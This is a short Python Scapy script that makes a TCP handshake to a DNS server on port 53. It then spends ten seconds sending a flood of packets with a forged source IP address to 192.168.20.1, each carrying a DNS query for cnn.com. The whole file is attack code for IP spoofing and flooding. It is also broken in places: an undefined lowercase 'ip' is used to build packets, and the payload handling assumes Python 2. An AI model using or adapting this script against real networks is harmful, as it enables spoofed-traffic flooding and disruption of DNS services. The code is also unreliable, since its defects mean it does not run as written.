from scapy.all import *
import time

A= "192.168.30.1"
B= "192.168.20.1"

request = DNS(rd=1, qd=DNSQR(qname = "cnn.com", qtype="A")) # size = 25, hex = 0x19
twoBytesRequestSize = "\x00\x19" #BIG ENDIAN
C = str(request) + twoBytesRequestSize
# Create TCP Packet with SYN
SYN = ip/TCP(sport=RandNum(1024,65535), dport=53, flags="S", seq = 32)
# Send the crafted packet, and get SYN ACK from the other end
SYNACK = sr1(SYN)
# We, the client need to send ACK for the server's SYN
ACK = ip/TCP(sport=SYNACK.dport, dport=53, flags="A", seq=SYNACK.ack, ack = SYNACK.seq +1)
send(ACK)

start = time.time()
while (time.time() - start < 10):
    spoofed_packet = IP(src=A, dst=B) / TCP(sport=SYNACK.dport, dport=53, flags="PA", seq=SYNACK.ack, ack = SYNACK.seq +1) / C
    send(spoofed_packet)
